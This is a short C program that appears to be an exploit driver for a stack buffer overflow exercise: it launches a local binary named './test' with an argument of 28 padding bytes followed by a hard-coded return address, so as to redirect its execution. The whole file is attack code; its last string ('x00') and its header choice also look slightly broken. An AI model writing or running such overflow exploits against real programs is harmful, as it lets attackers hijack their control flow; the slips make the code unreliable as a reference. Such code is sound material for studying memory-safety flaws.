#include "stdio.h"

char code[] = 
    "0123456789ABCDEF0123456789ab"
    "\xc5\x91\x04\x08"
    "x00";

int main(void) 
{
    char *arg[3];
    arg [0] = "./test";
    arg[1] = code;
    arg[2] = NULL;
    execve(arg[0], arg, NULL);
    return 0;
}